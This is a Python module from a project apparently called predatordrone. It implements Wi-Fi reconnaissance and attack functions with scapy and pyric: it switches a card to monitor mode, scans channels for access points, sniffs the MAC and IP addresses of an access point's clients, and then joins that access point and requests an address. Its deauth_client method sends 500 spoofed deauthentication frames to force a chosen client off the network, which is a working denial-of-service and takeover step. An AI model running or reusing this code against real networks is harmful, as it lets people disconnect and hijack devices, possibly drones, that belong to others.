#! /usr/bin/env python3
#
# Wifi management
#

from predatordrone.external_exec import do
import predatordrone.disp as disp

from scapy.all import *

import pyric.pyw as pyw
import pyric
import time



# ============================================
#    Access point and client representation
# ============================================

class AccessPoint:
    def __init__(self, ssid, bssid, channel, crypto):
        self.ssid   = ssid
        self.bssid  = bssid
        self.chan   = channel
        self.crypto = crypto

    def __str__(self):
        return "AP " + self.bssid \
            + " with SSID " + self.ssid \
            + " on channel " + str(self.chan) \
            + " (" + ' / '.join(self.crypto) + ")"

    def short_str(self):
        return self.ssid + " (" + self.bssid + ")"

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__



class Client:
    def __init__(self, mac, ip):
        self.mac = mac
        self.ip  = ip

    def __str__(self):
        return self.ip + " with MAC " + self.mac

    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.__dict__ == other.__dict__




# ============================
#    WiFi device management
# ============================

class WifiManager:
    WIFI_CHAN_MIN = 1
    WIFI_CHAN_MAX = 13


    def __init__(self, iface):
        self.detected_aps = []
        self.iface        = iface.replace("mon", "")

        # Check interface is wireless
        if not pyw.iswireless(iface):
            disp.die(iface, "is not a wireless interface!\n",
                    "   Available interfaces: ", pyw.winterfaces())

        # Register carde
        self.card = pyw.getcard(iface)

        # Check if card supports monitor mode
        if 'monitor' not in pyw.devmodes(self.card):
            disp.die(iface_name, "does not support monitor mode!")



    # =======================
    #    Device management
    # =======================

    def __set_channel(self, channel):
        pyw.chset(self.card, channel)

    def __check_mode(self, mode):
        return pyw.devinfo(self.card)['mode'] == mode

    def __set_mode_managed(self):
        self.__set_mode("managed")

    def __set_mode_monitor(self):
        self.__set_mode("monitor")


    def __set_mode(self, mode):
        disp.debug("Switching adapter to", mode, "mode")

        if self.__check_mode(mode):
            disp.warn("Wireless card already in", mode, "mode!")
        else:
            iface = self.iface + ("mon" if mode == "monitor" else "")
            card  = pyw.devadd(self.card, iface, mode)
            pyw.devdel(self.card)

            self.card = card
            pyw.up(self.card)



    # ==========================
    #    Access point listing
    # ==========================

    def __f_beacon_probe_resp(self, p):
        """ Filter WiFi beacon and probe response packets. """
        return p.haslayer(Dot11Beacon)


    def __add_access_point(self, p):
        """ Register an access point. """
        netstats = p[Dot11Beacon].network_stats()

        # Get AP details
        bssid    = p.addr3
        ssid     = netstats['ssid']
        channel  = netstats['channel']
        crypto   = netstats['crypto']

        # Build AccessPoint object
        ap = AccessPoint(ssid, bssid, channel, crypto)

        # Save discovered AP
        if ap not in self.detected_aps:
            self.detected_aps.append(ap)
            disp.item1(ap)


    def refresh_aps_list(self):
        """ Refresh APs list. """
        self.__set_mode_monitor()

        disp.info("Searching for new running APs")
        for chan in range(self.WIFI_CHAN_MIN, self.WIFI_CHAN_MAX + 1):
            self.__set_channel(chan)
            sniff(iface=self.card.dev, timeout=0.1, lfilter=self.__f_beacon_probe_resp,
                    prn=self.__add_access_point)

        self.__set_mode_managed()


    def show_detected_aps(self):
        """ Show detected access points. """
        print("Found APs:")
        if len(self.detected_aps) == 0:
            disp.item0(disp.red("No AP found!"))
        else:
            for ap in self.detected_aps: disp.item0(ap)


    def clear_aps_list(self):
        """ Clears APs list. """
        self.detected_aps = []



    # =====================
    #    Clients listing
    # =====================

    def __f_bssid_clients(self, bssid, p):
        """ Filter wifi clients of a specific BSSID. """
        return ( ( p.haslayer(Dot11) or p.haslayer(Dot11FCS) )
                and p.addr3 == bssid and p.haslayer(IP) )


    def __add_ssid_client(self, reg_client, p):
        """ Register client of a specific BSSID. """
        # Extract informations
        mac_dst = p.addr1
        mac_src = p.addr2
        bssid   = p.addr3

        ip_dst = p[IP].dst
        ip_src = p[IP].src

        mac = mac_src   if mac_src != bssid     else mac_dst
        ip  = ip_src    if mac_src != bssid     else ip_dst

        # Register client
        reg_client( Client(mac, ip) )


    def search_clients(self, ap, reg_client):
        """
        Search for new clients.
        
        : param ap          The access point for which search clients
        : param reg_client  A callback called when a client is found
        """
        self.__set_mode_monitor()
        self.__set_channel(ap.chan)
        sniff(iface=self.card.dev,
                lfilter=lambda p: self.__f_bssid_clients(ap.bssid,   p),
                prn    =lambda p: self.__add_ssid_client(reg_client, p),
                timeout=1)
        self.__set_mode_managed()



    # =======================
    #    Client management
    # =======================

    def deauth_client(self, client, ap):
        # Build deauth packets: addr1=dst, addr2=src, addr3=bssid
        deauth_pkt = RadioTap() \
                / Dot11(addr1=ap.bssid, addr2=client.mac, addr3=ap.bssid) \
                / Dot11Deauth(reason=7)

        # Send packets
        self.__set_mode_monitor()
        self.__set_channel(ap.chan)
        sendp(deauth_pkt, iface=self.card.dev, count=500, verbose=disp.Verb.isdebug())
        self.__set_mode_managed()


    def connect_access_point(self, ap, force=True):
        while not pyw.isconnected(self.card):
            try:
                pyw.connect(self.card, ap.ssid.encode(), bssid=ap.bssid)
                time.sleep(0.1)
            except pyric.error:
                pass


    def acquire_ip(self):
        if not pyw.isconnected(self.card):
            disp.error("Can't acquire IP using DHCP: wireless card not connected to AP!")
            return False
        else:
            do("dhclient -r")
            do("dhclient -v", self.card.dev)
            return True
